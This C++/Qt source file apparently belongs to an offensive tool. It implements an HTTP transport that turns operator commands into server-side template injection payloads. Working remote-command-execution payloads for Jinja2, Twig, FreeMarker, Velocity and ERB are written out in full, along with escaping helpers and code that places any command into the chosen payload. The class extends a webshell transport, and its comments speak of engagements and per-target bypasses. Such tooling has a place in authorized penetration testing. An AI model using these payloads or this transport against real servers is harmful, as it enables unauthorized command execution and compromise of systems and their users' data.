#include "HttpSstiTransport.h"

namespace {

// {CMD} placeholder location is where the operator's command lands.
// Payloads are the well-known ones seen across engagements; they can be
// overridden per-target if the operator has a custom bypass.
QString jinja2Payload() {
    return QStringLiteral(
        "{{ config.__class__.__init__.__globals__['os'].popen('{CMD}').read() }}");
}
QString twigPayload() {
    return QStringLiteral(
        "{{ ['{CMD}']|filter('system') }}");
}
QString freemarkerPayload() {
    return QStringLiteral(
        "<#assign x=\"freemarker.template.utility.Execute\"?new()>${x(\"{CMD}\")}");
}
QString velocityPayload() {
    return QStringLiteral(
        "#set($x=$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"{CMD}\"))");
}
QString erbPayload() {
    return QStringLiteral("<%= %x[{CMD}] %>");
}

QString shellEscape(const QString &cmd) {
    // Single-quote-safe: any single quote in the command becomes '\''
    QString out;
    for (QChar c : cmd) {
        if (c == QLatin1Char('\'')) out += QLatin1String("'\\''");
        else                        out += c;
    }
    return out;
}

QString pythonEscape(const QString &cmd) {
    QString out;
    for (QChar c : cmd) {
        if (c == QLatin1Char('\'') || c == QLatin1Char('\\')) out += QLatin1Char('\\');
        out += c;
    }
    return out;
}

}  // namespace

QString HttpSstiTransport::payloadForEngine(const QString &engine) {
    if (engine.compare("jinja2",     Qt::CaseInsensitive) == 0) return jinja2Payload();
    if (engine.compare("twig",       Qt::CaseInsensitive) == 0) return twigPayload();
    if (engine.compare("freemarker", Qt::CaseInsensitive) == 0) return freemarkerPayload();
    if (engine.compare("velocity",   Qt::CaseInsensitive) == 0) return velocityPayload();
    if (engine.compare("erb",        Qt::CaseInsensitive) == 0) return erbPayload();
    return {};
}

QStringList HttpSstiTransport::knownEngines() {
    return { "jinja2", "twig", "freemarker", "velocity", "erb", "custom" };
}

HttpSstiTransport::HttpSstiTransport(const SstiConfig &cfg, QObject *parent)
    : HttpWebshellTransport(cfg, parent),
      m_ssti(cfg)
{
    if (m_ssti.payloadTemplate.isEmpty() && m_ssti.engine.compare("custom", Qt::CaseInsensitive) != 0)
        m_ssti.payloadTemplate = payloadForEngine(m_ssti.engine);
}

QString HttpSstiTransport::transformCommand(const QString &command) const {
    if (m_ssti.payloadTemplate.isEmpty()) return command;
    QString escaped = command;
    if      (m_ssti.cmdEscape.compare("shell",  Qt::CaseInsensitive) == 0) escaped = shellEscape(command);
    else if (m_ssti.cmdEscape.compare("python", Qt::CaseInsensitive) == 0) escaped = pythonEscape(command);
    QString out = m_ssti.payloadTemplate;
    return out.replace(QStringLiteral("{CMD}"), escaped);
}
